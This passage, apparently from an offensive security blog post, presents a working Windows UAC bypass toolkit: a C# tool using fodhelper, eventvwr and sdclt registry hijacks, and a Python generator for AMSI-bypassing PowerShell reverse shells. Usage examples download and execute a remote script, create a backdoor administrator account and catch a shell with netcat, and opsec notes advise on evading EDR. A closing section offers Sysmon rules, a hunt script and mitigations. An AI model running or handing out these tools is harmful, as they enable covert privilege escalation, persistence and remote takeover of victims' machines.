        public Func<string, bool> Execute;
        public bool     NeedsFilesystem; // true = cmd must be a file path
    }

    static List<BypassEntry> BuildCatalogue(string cmd) => new() {
        new BypassEntry {
            Name            = "fodhelper",
            Binary          = "fodhelper.exe",
            Notes           = "ms-settings HKCU registry hijack — most reliable",
            Execute         = c => BypassFodhelper(c),
            NeedsFilesystem = false
        },
        new BypassEntry {
            Name            = "eventvwr",
            Binary          = "eventvwr.exe",
            Notes           = "mscfile HKCU registry hijack",
            Execute         = c => BypassEventvwr(c),
            NeedsFilesystem = false
        },
        new BypassEntry {
            Name            = "sdclt",
            Binary          = "sdclt.exe /kickoffelev",
            Notes           = "App Paths control.exe redirect — requires file path payload",
            Execute         = c => BypassSdclt(c),
            NeedsFilesystem = true
        },
    };

    // ── main ──────────────────────────────────────────────────────────────
    static int Main(string[] args) {
        // parse args
        string cmd    = "powershell.exe -nop -w hidden -ep bypass";
        string method = null;
        bool   list   = false;

        for (int i = 0; i < args.Length; i++) {
            if (args[i] == "--cmd"    && i+1 < args.Length) cmd    = args[++i];
            if (args[i] == "--method" && i+1 < args.Length) method = args[++i];
            if (args[i] == "--list") list = true;
        }

        int integrity = GetIntegrityLevel();
        Console.WriteLine($"[*] current integrity: 0x{integrity:X}");

        if (integrity >= HIGH_INTEGRITY) {
            Console.WriteLine("[+] already High integrity — no bypass needed");
            return 0;
        }
        if (integrity < MEDIUM_INTEGRITY) {
            Console.Error.WriteLine("[-] below Medium integrity — bypass will fail");
            return 1;
        }

        var catalogue = BuildCatalogue(cmd);

        if (list) {
            Console.WriteLine("\n[*] available bypasses:");
            foreach (var b in catalogue)
                Console.WriteLine($"    {b.Name,-15} {b.Binary,-30} {b.Notes}");
            return 0;
        }

        // filter to requested method or try all
        var targets = method != null
            ? catalogue.FindAll(b => b.Name.Equals(method, StringComparison.OrdinalIgnoreCase))
            : catalogue;

        if (targets.Count == 0) {
            Console.Error.WriteLine($"[-] unknown method: {method}");
            return 1;
        }

        Console.WriteLine($"[*] command: {cmd}");

        foreach (var bypass in targets) {
            Console.WriteLine($"\n[*] trying: {bypass.Name} ({bypass.Binary})");
            try {
                bool ok = bypass.Execute(cmd);
                if (ok) {
                    Console.WriteLine($"[+] {bypass.Name} executed — check your listener");
                    return 0;
                }
            } catch (Exception ex) {
                Console.Error.WriteLine($"    [-] {bypass.Name} failed: {ex.Message}");
            }
        }

        Console.Error.WriteLine("\n[-] all bypass methods failed");
        return 1;
    }
}
```

```cmd {linenos=inline}
:: compile
csc.exe /out:UACBypass.exe UACBypass.cs

:: list available bypasses
UACBypass.exe --list

:: auto-select bypass, default powershell command
UACBypass.exe

:: custom command
UACBypass.exe --cmd "powershell -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')"

:: force specific bypass
UACBypass.exe --method eventvwr --cmd "cmd /c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add"
```

---

## Python Payload Generator

Generates ready-to-paste PowerShell bypass commands for each technique, with optional AMSI bypass prepended.

```python {linenos=inline}
#!/usr/bin/env python3
# uac_bypass_gen.py
# Generates UAC bypass payloads combining a bypass technique
# with optional AMSI bypass and a reverse shell.
#
# Usage:
#   python3 uac_bypass_gen.py --lhost 10.10.10.10 --lport 4444
#   python3 uac_bypass_gen.py --lhost 10.10.10.10 --lport 4444 --technique eventvwr
#   python3 uac_bypass_gen.py --lhost 10.10.10.10 --lport 4444 --amsi --b64

import argparse
import base64
import random
import string

def rand_var(n=8):
    return '$' + ''.join(random.choices(string.ascii_lowercase, k=n))

def make_revshell(lhost, port):
    return (
        f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{port});"
        f"$s=$c.GetStream();"
        f"[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);"
        f"$rb=[Text.Encoding]::ASCII.GetBytes($r+'PS '+(gl).Path+'> ');"
        f"$s.Write($rb,0,$rb.Length);$s.Flush()}}"
    )

def make_amsi_bypass():
    v1, v2, v3 = rand_var(), rand_var(), rand_var()
    return (
        f"{v1}='System.Management.Automation.'+'AmsiUtils';"
        f"{v2}=[Ref].Assembly.GetType({v1});"
        f"{v3}={v2}.GetField('amsi'+'Context','NonPublic,Static');"
        f"{v3}.SetValue($null,[IntPtr]::Zero);"
    )

def encode_cmd(ps_code):
    encoded = base64.b64encode(ps_code.encode('utf-16-le')).decode()
    return f"powershell -nop -w hidden -ep bypass -EncodedCommand {encoded}"

def make_fodhelper(cmd, b64=False):
    inner = encode_cmd(cmd) if b64 else f"powershell -nop -w hidden -ep bypass -c \"{cmd}\""
    reg   = r"HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    return (
        f"$p='{reg}';"
        f"New-Item $p -Force|Out-Null;"
        f"Set-ItemProperty $p '(Default)' '{inner}';"
        f"New-ItemProperty $p 'DelegateExecute' -Value '' -Force|Out-Null;"
        f"Start-Process $env:WINDIR\\System32\\fodhelper.exe -WindowStyle Hidden;"
        f"Start-Sleep 3;"
        f"Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force -EA 0"
    )

def make_eventvwr(cmd, b64=False):
    inner = encode_cmd(cmd) if b64 else f"powershell -nop -w hidden -ep bypass -c \"{cmd}\""
    reg   = r"HKCU:\Software\Classes\mscfile\shell\open\command"
    return (
        f"$p='{reg}';"
        f"New-Item $p -Force|Out-Null;"
        f"Set-ItemProperty $p '(Default)' '{inner}';"
        f"Start-Process $env:WINDIR\\System32\\eventvwr.exe -WindowStyle Hidden;"
        f"Start-Sleep 3;"
        f"Remove-Item 'HKCU:\\Software\\Classes\\mscfile' -Recurse -Force -EA 0"
    )

def make_sdclt(payload_path):
    reg = r"HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
    return (
        f"$p='{reg}';"
        f"New-Item $p -Force|Out-Null;"
        f"Set-ItemProperty $p '(Default)' '{payload_path}';"
        f"Start-Process $env:WINDIR\\System32\\sdclt.exe -ArgumentList '/kickoffelev' -WindowStyle Hidden;"
        f"Start-Sleep 3;"
        f"Remove-Item $p -Force -EA 0"
    )

TECHNIQUES = {
    'fodhelper': make_fodhelper,
    'eventvwr':  make_eventvwr,
}

def main():
    p = argparse.ArgumentParser(description="UAC bypass payload generator")
    p.add_argument('--lhost',      required=True)
    p.add_argument('--lport',      default=4444, type=int)
    p.add_argument('--technique',  choices=list(TECHNIQUES.keys()) + ['sdclt', 'all'],
                   default='all')
    p.add_argument('--amsi',       action='store_true', help='prepend AMSI bypass')
    p.add_argument('--b64',        action='store_true', help='base64-encode inner command')
    p.add_argument('--sdclt-path', default=r'C:\Windows\Tasks\payload.exe',
                   help='payload path for sdclt technique')
    args = p.parse_args()

    shell     = make_revshell(args.lhost, args.lport)
    amsi      = make_amsi_bypass() if args.amsi else ''
    inner_cmd = amsi + shell

    targets = list(TECHNIQUES.keys()) if args.technique == 'all' else [args.technique]
    if args.technique in ('all', 'sdclt'):
        targets.append('sdclt')

    for t in targets:
        print(f"\n{'='*70}")
        print(f"# technique: {t}")
        print('='*70)

        if t == 'sdclt':
            payload = make_sdclt(args.sdclt_path)
        else:
            payload = TECHNIQUES[t](inner_cmd, args.b64)

        print(payload)

        # also print as a one-liner wrapped in powershell -c
        full = f"powershell -nop -w hidden -ep bypass -c \"{payload}\""
        enc  = base64.b64encode(
            (f"powershell -nop -ep bypass -c \"{payload}\"").encode('utf-16-le')
        ).decode()
        print(f"\n# encoded one-liner:")
        print(f"powershell -nop -w hidden -ep bypass -EncodedCommand {enc}")

if __name__ == '__main__':
    main()
```

```bash
# generate all techniques with AMSI bypass, base64-encoded
python3 uac_bypass_gen.py --lhost 10.10.10.10 --lport 4444 --amsi --b64 --technique all

# fodhelper only
python3 uac_bypass_gen.py --lhost 10.10.10.10 --lport 4444 --technique fodhelper

# sdclt with custom payload path
python3 uac_bypass_gen.py --lhost 10.10.10.10 --lport 4444 --technique sdclt \
    --sdclt-path "C:\Windows\Tasks\svcupdate.exe"
```

---

## Full Engagement Workflow

``` {linenos=inline}
1.  Check integrity level
    whoami /groups | findstr Mandatory
    → must be "Medium Mandatory Level" to proceed

2.  Apply AMSI bypass (see AMSI blog)
    → prevents bypass payload from being blocked before execution

3.  Enumerate available bypass paths
    .\Find-UACRegistryGaps.ps1

4.  Select technique based on target OS / patch level:
    Win10 pre-2019:  fodhelper or eventvwr (most reliable)
    Win10 post-2019: sdclt or SilentCleanup (if patched)
    Win11:           CMLuaUtil COM or SilentCleanup DLL

5.  Generate payload
    python3 uac_bypass_gen.py --lhost 10.10.10.10 --lport 4444 --amsi --b64

6.  Execute and catch shell
    nc -lvnp 4444

7.  Verify elevation on new shell
    whoami /groups | findstr "High Mandatory"

8.  Proceed with post-exploitation from High integrity
```

---

## Technique Comparison

| technique | target binary | OS coverage | noise | patches needed |
|-----------|--------------|-------------|-------|----------------|
| fodhelper | fodhelper.exe | Win10/11 | medium | ms-settings HKCU |
| eventvwr | eventvwr.exe | Win7-11 | medium | mscfile HKCU |
| sdclt | sdclt.exe | Win10 | medium | App Paths HKCU |
| SilentCleanup | DismHost.exe | Win10/11 | low | PATH + DLL drop |
| ICMLuaUtil COM | cmluautil.dll | Win7-11 | low | none — pure COM |
| IFileOperation | shell32.dll | Win7-11 | low | none — file copy |

---

## OpSec Notes

- **Registry artifacts** — all HKCU-based bypasses leave keys that EDR and Sysmon will catch on EID 13 (RegistryValueSet). Always clean up immediately after the bypass triggers — the scripts above do this automatically.
- **Process ancestry** — High-integrity shells spawned from fodhelper or eventvwr will have those binaries as parent processes. `fodhelper.exe → powershell.exe` is a well-known detection pattern. Prefer spawning a sacrificial process and injecting rather than running your C2 directly as a child.
- **CMLuaUtil** is the quietest option: no HKCU registry writes, no suspicious process parents. The COM invocation can still be caught by ETW.
- **SilentCleanup** runs on a schedule. You can pre-plant the DLL and wait for the next scheduled run rather than triggering it yourself, which avoids the suspicious `Start-ScheduledTask` call.
- **Windows 11 22H2+** has patched fodhelper and eventvwr. Always verify the OS build before selecting a technique.

---

## Detection (Blue Team)

| signal | event |
|--------|-------|
| HKCU `ms-settings\Shell\Open\command` created | Sysmon EID 13 — RegistryValueSet |
| HKCU `mscfile\shell\open\command` created | Sysmon EID 13 — RegistryValueSet |
| `fodhelper.exe` spawning shells | Sysmon EID 1 — ParentImage |
| `eventvwr.exe` spawning shells | Sysmon EID 1 — ParentImage |
| `sdclt.exe /kickoffelev` in command line | Sysmon EID 1 — CommandLine |
| High-integrity process with suspicious parent | Sysmon EID 1 — IntegrityLevel + ParentImage |
| `SilentCleanup` task triggered manually | Windows Task Scheduler EID 200 |
| Unsigned DLL loaded by DismHost.exe | Sysmon EID 7 — ImageLoad |

**Sysmon detection rules:**

```xml {linenos=inline}
<!-- UAC bypass registry key creation -->
<RegistryEvent onmatch="include">
  <TargetObject condition="contains">ms-settings\Shell\Open\command</TargetObject>
  <TargetObject condition="contains">mscfile\shell\open\command</TargetObject>
  <TargetObject condition="contains">App Paths\control.exe</TargetObject>
</RegistryEvent>

<!-- Auto-elevated binaries spawning children -->
<ProcessCreate onmatch="include">
  <ParentImage condition="is">C:\Windows\System32\fodhelper.exe</ParentImage>
  <ParentImage condition="is">C:\Windows\System32\eventvwr.exe</ParentImage>
  <ParentImage condition="is">C:\Windows\System32\sdclt.exe</ParentImage>
</ProcessCreate>
```

**PowerShell hunt query — find UAC bypass registry artifacts:**

```powershell {linenos=inline}
# Hunt-UACBypassKeys.ps1
$suspiciousKeys = @(
    "HKCU:\Software\Classes\ms-settings",
    "HKCU:\Software\Classes\mscfile",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
)

foreach ($key in $suspiciousKeys) {
    if (Test-Path $key) {
        Write-Host "[!] SUSPICIOUS KEY FOUND: $key" -ForegroundColor Red
        Get-ItemProperty $key -ErrorAction SilentlyContinue |
            Format-List | Out-Host
    }
}

# also query Sysmon EID 13 for recent registry writes to these paths
Get-WinEvent -FilterHashtable @{
    LogName = "Microsoft-Windows-Sysmon/Operational"; Id = 13
} -MaxEvents 500 -ErrorAction SilentlyContinue |
Where-Object { $_.Message -match "ms-settings|mscfile|App Paths\\control" } |
Select-Object TimeCreated, Message | Format-List
```

**Mitigation:**
```powershell
# Set UAC to "Always notify" — makes auto-elevation require explicit prompt
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
    -Name "ConsentPromptBehaviorAdmin" -Value 2 -Type DWord

# Disable auto-elevation entirely (breaks some legitimate apps)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
    -Name "EnableLUA" -Value 1 -Type DWord
```

---

## MITRE ATT&CK

| technique | ID | description |
|-----------|----|-------------|
| Bypass User Account Control | T1548.002 | All registry hijack techniques |
| Abuse Elevation Control Mechanism | T1548 | Parent technique |
| Hijack Execution Flow | T1574 | SilentCleanup DLL hijack |
| Modify Registry | T1112 | HKCU key manipulation |
| Defense Evasion | TA0005 | Primary tactic |
| Privilege Escalation | TA0004 | Primary tactic |

---

## References

- [MITRE ATT&CK T1548.002 — Bypass UAC](https://attack.mitre.org/techniques/T1548/002/)
- hfiref0x — [UACME project](https://github.com/hfiref0x/UACME) (comprehensive bypass catalogue)
- Matt Nelson (@enigma0x3) — fodhelper and eventvwr research
- [PayloadsAllTheThings — UAC Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [LOLBAS Project](https://lolbas-project.github.io/)
- Oddvar Moe — sdclt research
- James Forshaw — Windows security internals and UAC analysis
- [api0cradle — UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
